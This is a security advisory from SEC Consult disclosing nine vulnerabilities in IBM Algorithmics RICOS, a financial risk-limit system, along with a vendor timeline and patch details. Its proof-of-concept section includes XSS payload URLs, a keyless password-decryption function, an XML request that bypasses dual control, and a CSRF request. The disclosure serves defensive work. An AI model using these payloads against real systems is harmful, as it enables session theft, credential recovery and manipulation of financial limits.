@@ -1,0 +1,361 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+SEC Consult Vulnerability Lab Security Advisory < 20140630-0 >
+=======================================================================
+              title: Multiple severe vulnerabilities
+            product: IBM Algorithmics RICOS
+ vulnerable version: 4.5.0 - 4.7.0
+      fixed version: 4.7.0.03
+         CVE number: CVE-2014-0894
+                     CVE-2014-0871
+                     CVE-2014-0870
+                     CVE-2014-0869
+                     CVE-2014-0868
+                     CVE-2014-0867
+                     CVE-2014-0866
+                     CVE-2014-0865
+                     CVE-2014-0864
+             impact: critical
+           homepage: http://www-01.ibm.com/software/analytics/algorithmics/
+              found: 2013-12-19
+                 by: A. Kolmann, V. Habsburg-Lothringen, F. Lukavsky
+                     SEC Consult Vulnerability Lab
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+- -------------------
+IBM Algorithmics software enables financial institutions and corporate
+treasuries to make risk-aware business decisions. Supported by a global
+team of risk experts based in all major financial centers, IBM
+Algorithmics solution offerings include market, credit and liquidity risk,
+as well as collateral and capital management.
+
+Source: http://www-01.ibm.com/software/analytics/algorithmics/
+
+RICOS is a pre-deal limit management solution part of the Algo Suite.
+
+
+Business recommendation:
+- ------------------------
+The identified vulnerabilities affect integrity and confidentiality of the
+risk management system. SEC Consult does not recommend to rely on RICOS as
+part of risk management until a thorough security review has been performed
+by security professionals. As a workaround, access should be limited only to
+trusted users internally and sample checks regarding the plausibility of limits
+should be performed manually.
+
+
+Vulnerability overview/description:
+- -----------------------------------
+1) Information Disclosure (PSIRT#1440 / CVE-2014-0871 / CVSS 4.3)
+The Tomcat configuration discloses technical details within error messages to
+the user, which allows an attacker to collect valuable data about the
+environment of the solution.
+
+2) Password Disclosure (PSIRT#1441 / CVE-2014-0894 / CVSS 3.5)
+The password and the username of the backend database are disclosed in
+clear-text to the user of the web application. This allows attackers to
+directly connect to the backend database and manipulate arbitrary data stored
+in the database (e.g. limits).
+
+3) Non-permanent Cross-Site Scripting (PSIRT#1442 / CVE-2014-0870 / CVSS 4.3)
+Several parameters in the RICOS web front end and the Blotter are not properly
+sanitized and cause Cross-Site Scripting vulnerabilities. Attackers can steal
+user sessions and impersonate other users while performing arbitrary actions
+on behalf of the victim user.
+
+4) Broken Encryption (PSIRT#1443 / CVE-2014-0869 / CVSS 4.3)
+Weak cryptographic algorithms, being used to store and transfer
+user's passwords, allow an attacker to retrieve the plain-text passwords
+without further knowledge of cryptographic keys.
+
+5) Manipulation of read-only data / dual control mechanism bypass (PSIRT#1444 / CVE-2014-0868 /
+CVSS 3.5)
+Several fields of stored data within RICOS are marked as read-only in the web
+application, disallowing modification of certain fields. These checks are only
+performed client-side, allowing an attacker to alter arbitrary data. An
+attacker can create a limit, alter the username of the created limit and
+confirm the limit himself, circumventing dual control mechanisms advertised by
+RICOS.
+
+6) Cross-Site Cookie Setting (PSIRT#1445 / CVE-2014-0867 / CVSS 4.3)
+A vulnerable page in RICOS allows an attacker to set and overwrite arbitrary
+cookies for a user that clicks on a manipulated link.
+
+7) Plain-text submission of passwords (PSIRT#1446 / CVE-2014-0866 / CVSS 4.3)
+The RICOS fat client submits user credentials in plain-text. An attacker with
+access to the network communication can perform man-in-the-middle attacks and
+steal user credentials.
+This vulnerability also applies to the Blotter, where authentication is
+performed unencrypted.
+
+8) Client-side Input Validation (PSIRT#1447 / CVE-2014-0865 / CVSS 3.5)
+The RICOS fat client performs input validation only client-side. This allows
+an attacker to alter arbitrary data. An attacker can create a limit, alter
+the username of the created limit and confirm the limit himself, circumventing
+dual control mechanisms advertised by RICOS.
+
+9) Cross-Site Request Forgery (PSIRT#1448 / CVE-2014-0864 / CVSS 4.3)
+The web application does not verify that requests are made only from within
+the web application, allowing an attacker to trick users into performing
+requests to the web application. This allows an attacker to perform tasks on
+behalf of the victim user like modifying limits.
+
+
+Proof of concept:
+- -----------------
+1) Information Disclosure
+The following URL causes a status 404, disclosing the Tomcat version:
+https://ricos/ricos470/classes/
+
+If control characters (i.e. \x00) are sent as part of the cookie, a stack trace
+is triggered
+
+2) Password Disclosure
+The following request sent by the client during regular communication shows the
+database connection settings including the username and the password in
+clear-text.
+
+POST /ricos470/Executer HTTP/1.1
+Host: ricos
+
+...SNIP...
+<i n="URN" v=""/><i n="SecServiceURN" v="obsv2:ricos:20100"/><i n="SecSource" v="LM web"/><i
+n="SecTimeout" v="7200"/><i n="AcsAutoReconnect" v="Y"/><i n="AcsFunctionLimits" v=""/></t><t
+n="ObServer"><i n="UserId" v=""/><i n="Password" v=""/><i n="Host" v="ricos"/><i n="Port"
+v="20100"/><i n="CollectionId" v=""/><i n="DbName" v="RICA"/><i n="Location" v="RICA"/><i
+n="DbType" v="ORA"/><i n="Application" v="RICOS"/><i n="AppId" v="LM web"/><i n="AppDesc" v=""/><i
+n="AppVer" v="4.7.0"/><i n="Component" v="RICOS Gui"/><i n="DbUser" v="rica"/><i n="DbPass"
+v="password"/>
+...SNIP...
+
+3) Non-permanent Cross-Site Scripting
+The following URLs demonstrate Cross-Site Scripting vulnerabilities:
+
+POST /ricos470/rcore6/main/showerror.jsp HTTP/1.1
+Host: ricos
+
+Message=<script>alert(document.cookie)</script>%0D%0A&Stack=java.lang....
+
+https://ricos/ricos470/rcore6/main/buttonset.jsp?ButtonsetClass=x";+alert(document.cookie);//x
+
+https://ricos/ricos470/rcore6/frameset.jsp?PROF_NAME=&Caller=login&ChildBrowser=Y&MiniBrowse=Y&OBJECT=profile_login&CAPTION_SELECT=MNU_PROFILE_VIEW&MBName=profile_login')");alert(document.cookie);//
+
+http://ricos/algopds/rcore6/main/browse.jsp?Init=N";alert(document.cookie)&Name=trades&StoreName=trades&HandlerFrame=Caption&ShowStatus=N&HasMargin=Y
+
+
+http://ricos/algopds/rcore6/main/ibrowseheader.jsp?Name=trades;alert(document.cookie)&StoreName=trades;alert(document.cookie)&STYLESHEET=browse"/><script>alert(document.cookie)</script>
+
+4) Broken Encryption
+The user's password is transported frequently in requests within the application.
+The following function decrypts the password without requiring any cryptographic key:
+
+public static void decrypt(String string)
+{
+  int nRadix = 32;
+  int nR2 = nRadix * nRadix / 2;
+  GregorianCalendar cal = new GregorianCalendar();
+  String key = string.substring(0, 2);
+  int nKey = Integer.parseInt(key, 32);
+  
+  String encPw = string.substring(2, string.length());
+  int y = 0;
+  for (int i = 0; i < encPw.length(); i+=2)
+  {
+    String aktuell = encPw.substring(i,i+2);  
+    int new_value = Integer.parseInt(aktuell, 32);
+    int character = - nKey * (y + 1) % nR2 + new_value;
+    char decrypt = (char) character;
+    System.out.print(decrypt);
+    y = y + 1;
+  }    
+}
+
+5) Manipulation of read-only data  / dual control mechanism bypass
+The following example illustrates how to manipulate a request so that the server
+saves it on behalf of another user (only the relevant parts are shown):
+
+<?xml version="1.0" encoding="UTF-8"?>
+<ds>
+  <t n="Service">
+    <i n="RequestType" v="#Action"/>
+    <t n="#ActionData">
+      <i n="#ActionName" v="web.getmeta_udf"/>
+      <i n="#Mode" v="#Sync"/>
+      <i n="#Request" v="#Execute"/>
+      <t n="#OutputData">
+        <t n="#MapTable">
+          <i n="#ResultData" v="#ResultData"/>
+          <i n="#ResultTable" v="#ResultTable"/>
+        </t>
+      </t>
+      <t n="#InputData">
+        <t n="#WorkTable">
+          <t n="det_limit">
+            <i n="SCTYGEID" v="A"/>
+[...]
+            <i n="LMLCURID" v="other_user"/>
+            <i n="LMEQEPSTDA" v=""/>
+[...]
+            <i n="MFURID" v="other_user"/>
+            <i n="LMEVFL" v="N"/>
+            <i n="SOLMFL" v="N"/>
+[...]
+                    <i n="CRURID" v="other_user"/>
+                    <i n="MFTS" v=""/>
+                    <i n="MFURID" v="other_user"/>
+[...]
+                    <i n="CRURID" v="other_user"/>
+                    <i n="MFTS" v=""/>
+[...]
+  </t>
+  <t n="Session">
+    <t n="SessionData">
+      <i n="LoginUser" v="other_user"/>
+      <i n="LoginPass" v="8HC34BCM5JE84ND95RED"/>
+[...]
+        <i n="LoginUser v="other_user"/>
+        <i n="LoginPWD" v="326K9DC9FNIT3T70A3D6"/>
+        <i n="URN" v=""/>
+        <i n="SecServiceURN" v="obsv2:ricos:20100"/>
+[...]
+      </t>
+      <t n="ObServer">
+        <i n="UserId" v="other_user"/>
+        <i n="Password" v=""/>
+        <i n="Host" v="ricos"/>
+[...]
+        <i n="Prefix" v="RICA"/>
+        <i n="DbSystem" v="oracle"/>
+        <i n="LoginUserId" v="other_user"/>
+      </t>
+    </t>
+  </t>
+</ds>
+
+6) Cross-Site Cookie Setting
+The following URL allows setting of arbitrary cookies:
+
+https://ricos/ricos470/rcore6/main/addcookie.jsp?test-cookie=cookie-content
+
+7) Plain-text submission of passwords
+Neither the fat client nor the Blotter use https to communicate with the
+backend server. Both send unencrypted credentials via http during authentication.
+
+8) Client-side Input Validation
+By manipulating serialized objects that are transmitted by the fat client,
+it is possible to change the user name who created a limit, allowing an attacker
+to bypass dual control mechanisms.
+
+9) Cross-Site Request Forgery
+The following request, sent on behalf of an authenticated user will e.g.
+change the currency of a given deal:
+
+POST http://ricos/ricos470/Executer HTTP/1.1
+Host: ricos
+
+<?xml version="1.0" encoding="UTF-8"?>
+<ds>
+  <t n="Service">
+    <i n="RequestType" v="#Action"/>
+    <t n="#ActionData">
+      <i n="#ActionName" v="web.updrec_msp"/>
+      <i n="#Mode" v="#Sync"/>
+      <i n="#Request" v="#Execute"/>
+      <t n="#InputData">
+        <t n="#MapTable">
+          <i n="#InputData" v="det_msp"/>
+        </t>
+        <t n="#WorkTable">
+          <t n="det_msp">
+            <i n="SYPMID" v="SYS-PAR-ID"/>
+            <i n="CUCD" v="USD"/>
+            <i n="MIGORILV" v="11"/>
+            <i n="ILPLMVFL" v="Y"/>
+            <i n="ILNEMVFL" v="Y"/>
+            <i n="BSCUONFL" v="N"/>
+            <i n="PBSCUOFL" v="N"/>
+            <i n="LORICUTEFL" v="N"/>
+            <i n="SYSAVAILFL" v="F"/>  
+            <i n="CUSTID" v="CUSTOMER"/>
+            <i n="CBNALI" v="IS-LOCATED-IN"/>
+            <i n="CBNAAG" v="AUTOMATIC-GROUP"/>
+            <i n="UDF1" v="Welcome to ricos 4.71"/>
+          </t>
+...SNIP...
+
+
+Vulnerable / tested versions:
+- -----------------------------
+IBM Algorithmics RICOS 4.71
+
+
+Vendor contact timeline:
+- ------------------------
+2014-01-24: Contacting vendor through psirt@vnet.ibm.com
+2014-01-24: Vendor response, will likely require more than 30 days to resolve issues
+            asking for acknowledgements
+2014-01-24: Sending acknowledgements
+2014-01-29: Vendor assigns PSIRT advisory numbers 1440-1448 to reported issues
+2014-02-07: Vendor confirms 8 of 9 vulnerabilities and sends CVE and CVSS
+2014-02-10: Providing further information on assumed to be false positive issue 1441
+2014-02-14: Telco to clarify vulnerability details and agree on further procedure
+            patches are scheduled for end of June 2014
+2014-02-20: Vendor confirms issue 1441 to be a vulnerability
+2014-05-27: Vendor announces that patches will be released on 2014-06-30
+2014-06-26: Vendor published patches and security bulletin
+            https://www-304.ibm.com/support/entdocview.wss?uid=swg21675881
+2014-06-30: SEC Consult publishes the advisory
+
+
+Solution:
+- ---------
+Apply patch ACLM 4.7.0.03 FP5. More information:
+https://www-304.ibm.com/support/entdocview.wss?uid=swg21675881
+
+
+Workaround:
+- -----------
+Limit access to RICOS and manually perform sample checks regarding the
+plausibility of limits.
+
+
+Advisory URL:
+- -------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Vienna - Bangkok - Frankfurt/Main - Montreal - Singapore - Vilnius
+
+Headquarter:
+Mooslackengasse 17, 1190 Vienna, Austria
+Phone:   +43 1 8903043 0
+Fax:     +43 1 8903043 15
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+Interested to work with the experts of SEC Consult?
+Write to career@sec-consult.com
+
+EOF F. Lukavsky / @2014
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+Comment: Using GnuPG with Thunderbird - http://www.enigmail.net/
+
+iQEcBAEBAgAGBQJTsZDnAAoJECyFJyAEdlkKDUIH/3d/PLRdTNA9EludLlr7M+K+
+uaBxgyajy8sT7dYMedR3EcxKxZSUGExnv+2X4GZN0Px8a9NvEewURIAiM+ZAsdYg
+uFKPtYcuhO6TyKV/QoPUsixEM3IgzyMpGqcf2qtWqNOb4jVpXvtyO2gLoHQNj04F
+uQl0v+1it2HNVxd6vEj2zj7neuOLb3WhE6ObDAlVkzcOutvTF84cVyNYpBBuCD6e
+0TsopvfkJ3l6iJPSvgXpl1gTmSoR0PfEC14JYVKCK0pTbhXc81J8YYGQnEklWazl
+EEUoMVM0I6Yzg9oXGpHf5cBX49pbzAYm5lhJkCDiSQ+2ueSYN0BEz3e2JMtDEZ8=
+=OFL7
+-----END PGP SIGNATURE-----
